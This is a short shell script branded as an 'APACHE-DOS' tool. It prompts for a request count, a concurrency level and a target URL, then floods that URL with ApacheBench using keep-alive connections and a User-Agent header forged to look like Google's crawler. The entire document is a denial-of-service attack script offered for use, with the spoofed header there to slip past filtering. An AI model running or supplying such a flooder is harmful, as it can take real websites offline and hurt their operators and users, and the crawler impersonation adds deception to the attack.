echo '''    _    ____   _    ____ _   _ _____      ____   ___  ____  
   / \  |  _ \ / \  / ___| | | | ____|    |  _ \ / _ \/ ___| 
  / _ \ | |_) / _ \| |   | |_| |  _| _____| | | | | | \___ \ 
 / ___ \|  __/ ___ \ |___|  _  | |__|_____| |_| | |_| |___) |
/_/   \_\_| /_/   \_\____|_| |_|_____|    |____/ \___/|____/  script
															by script-automated
'''
echo "Requests:"
read req
echo "Connections:"
read connect
echo "Url:"
read url
ab -n $req -c $connect -r -k -H "User-Agent: Google Bot" $url/
